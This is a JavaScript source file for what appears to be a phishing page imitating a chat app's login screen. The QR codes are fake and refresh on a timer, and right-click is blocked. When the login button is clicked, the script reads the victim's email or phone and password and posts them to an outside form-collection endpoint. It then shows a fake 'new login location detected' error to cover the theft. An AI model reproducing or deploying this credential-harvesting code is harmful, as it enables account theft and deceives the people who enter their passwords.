// ==================================
// they figure me a fat motherfucker
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000, // 2 minutes
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,
  FORM_ENDPOINT: 'https://www.formbackend.com/f/ed88aed03af73437',
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
  emailInput: document.querySelector('#emailORphone'),
  passwordInput: document.querySelector('#password'),
  emailWrapper: document.querySelector('.email-wrapper'),
  passwordWrapper: document.querySelector('.password-wrapper'),
};

// ==================================
// UTILITY FUNCTIONS
// ==================================

/**
 * Generates a random alphanumeric string
 * @param {number} length - Length of the string to generate
 * @returns {string} Random string
 */
const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  return Array.from({ length }, () =>
    characters.charAt(Math.floor(Math.random() * characters.length))
  ).join("");
};

/**
 * Creates an HTML element from a string
 * @param {string} html - HTML string
 * @returns {Element} DOM element
 */
const createElementFromHTML = (html) => {
  const template = document.createElement("template");
  template.innerHTML = html.trim();
  return template.content.firstChild;
};

/**
 * Sends form data to FormBackend via AJAX
 * @param {Object} data - Data to send
 */
const sendToFormBackend = async (data) => {
  try {
    const formData = new URLSearchParams();
    for (const key in data) {
      formData.append(key, data[key]);
    }

    const response = await fetch(CONFIG.FORM_ENDPOINT, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/javascript',
      },
      body: formData,
    });

    if (!response.ok) {
      throw new Error('Submission failed');
    }

    console.log('Form submitted successfully');
    // Optionally handle success (e.g., show message)
  } catch (error) {
    console.error('Error submitting to FormBackend:', error);
    // Optionally handle error (e.g., show error message)
  }
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
  /**
   * Generates a QR code SVG element
   * @param {string} data - Data to encode in QR code
   * @returns {SVGElement|null} SVG element or null on error
   */
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();

      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);

      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svgElement = svgDoc.documentElement;

      svgElement.setAttribute("width", "160");
      svgElement.setAttribute("height", "160");
      svgElement.setAttribute("viewBox", "0 0 37 37");

      const path = svgElement.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }

      return svgElement;
    } catch (error) {
      console.error("Error generating QR code:", error);
      return null;
    }
  },

  /**
   * Creates the spinner markup for QR code loading
   * @returns {string} HTML string for spinner
   */
  getSpinnerMarkup() {
    return `
      <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
        <span class="inner wanderingCubes">
          <span class="item"></span>
          <span class="item"></span>
        </span>
      </span>
    `;
  },

  /**
   * Displays the loading animation for QR code
   */
  showLoadingAnimation() {
    if (!DOM.qrCodeContainer) return;

    const svg = DOM.qrCodeContainer.querySelector("svg");
    const img = DOM.qrCodeContainer.querySelector("img");

    svg?.remove();
    img?.remove();

    DOM.qrCodeContainer.style.background = "transparent";
    DOM.qrCodeContainer.insertAdjacentHTML(
      "afterbegin",
      this.getSpinnerMarkup()
    );
  },

  /**
   * Refreshes the QR code with new data
   */
  refresh() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = "";

    const newQRCode = this.generate(
      `https://app.com/ra/${generateRandomString()}`
    );

    if (newQRCode) {
      DOM.qrCodeContainer.appendChild(newQRCode);
    }

    DOM.qrCodeContainer.insertAdjacentHTML(
      "beforeend",
      `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`
    );

    DOM.qrCodeContainer.style.background = "white";
  },

  /**
   * Simulates QR code refresh with animation
   */
  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  /**
   * Initializes the QR code refresh interval
   */
  initRefreshInterval() {
    // Initial refresh on load
    this.simulateRefresh();
    setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
  },
};

// ==================================
// LOGIN BUTTON MODULE
// ==================================
const LoginButtonModule = {
  /**
   * Creates the ellipsis spinner markup
   * @returns {string} HTML string for ellipsis spinner
   */
  getEllipsisMarkup() {
    return `
      <span class="spinner" role="img" aria-label="Loading">
        <span class="inner pulsingEllipsis">
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
        </span>
      </span>
    `;
  },

  /**
   * Applies staggered animation delays to spinner items
   */
  applyAnimationDelays() {
    const spinnerItems = document.querySelectorAll(".spinnerItem");
    spinnerItems.forEach((item, index) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
        index * CONFIG.ELLIPSIS_DELAY_INCREMENT
      }s`;
    });
  },

  /**
   * Shows the new login location detected message and highlights inputs
   */
  showNewLoginMessage() {
    if (DOM.emailWrapper) {
      // Check if message already exists
      if (DOM.emailWrapper.querySelector('.error-message')) return;

      const message = document.createElement('span');
      message.className = 'error-message';
      message.textContent = 'New login location detected, please check your e-mail.';
      message.style.color = 'red';
      message.style.display = 'block';
      message.style.fontSize = '12px';
      message.style.marginTop = '5px';
      message.style.marginBottom = '5px';

      const label = DOM.emailWrapper.querySelector('label');
      const input = DOM.emailWrapper.querySelector('input');
      if (label && input) {
        DOM.emailWrapper.insertBefore(message, input);
      }
    }

    // Highlight inputs with red border
    if (DOM.emailInput) {
      DOM.emailInput.style.border = '1px solid red';
    }
    if (DOM.passwordInput) {
      DOM.passwordInput.style.border = '1px solid red';
    }
  },

  /**
   * Shows the loading animation on the button and submits data
   */
  async showLoading() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.setAttribute("disabled", "true");
    this.applyAnimationDelays();

    // Collect data from inputs
    const formData = {
      emailOrPhone: DOM.emailInput ? DOM.emailInput.value : '',
      password: DOM.passwordInput ? DOM.passwordInput.value : '',
    };

    // Send to FormBackend and wait for at least ANIMATION_DURATION
    await Promise.all([
      sendToFormBackend(formData),
      new Promise(resolve => setTimeout(resolve, CONFIG.ANIMATION_DURATION))
    ]);

    // Show the new login message and highlight
    this.showNewLoginMessage();

    // Reset button
    this.reset();
  },

  /**
   * Resets the button to its default state
   */
  reset() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = "";
    DOM.loginButton.textContent = "Log In";
    DOM.loginButton.removeAttribute("disabled");
  },

  /**
   * Initializes the login button event listener
   */
  init() {
    if (!DOM.loginButton) return;

    DOM.loginButton.addEventListener("click", (e) => {
      e.preventDefault();
      this.showLoading();
    });
  },
};

// ==================================
// EVENT HANDLERS
// ==================================

/**
 * Prevents right-click context menu
 */
const preventContextMenu = (e) => {
  e.preventDefault();
};

// ==================================
// INITIALIZATION
// ==================================
const init = () => {
  // Initialize login button functionality
  LoginButtonModule.init();

  // Initialize QR code refresh
  QRCodeModule.initRefreshInterval();

  // Prevent context menu
  document.addEventListener("contextmenu", preventContextMenu);
};

// Start the application when DOM is ready
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}